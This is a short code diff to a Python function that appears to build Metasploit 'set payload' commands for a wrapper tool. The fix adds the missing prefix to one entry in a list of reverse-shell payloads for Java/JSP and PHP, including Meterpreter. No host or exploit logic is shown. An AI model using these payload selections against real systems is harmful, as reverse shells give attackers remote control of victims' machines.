@@ -58,7 +58,7 @@ def payload_setter(cmd_number):
     payload17 = f"set payload java/jsp_shell_reverse_tcp"
     payload18 = f"set payload java/jsp_shell_reverse_tcp"
     payload19 = f"set payload php/reverse_php"
-    payload20 = f"php/meterpreter_reverse_tcp"
+    payload20 = f"set payload php/meterpreter_reverse_tcp"
 
     fire_stored = [payload1,payload2,payload3,payload4,payload5,payload6,payload7,payload8,payload9,payload10,payload11,payload12,payload13,payload14,payload15,payload16,payload17,payload18,payload19,payload20]
     set_payload = (fire_stored[int(cmd_number)])
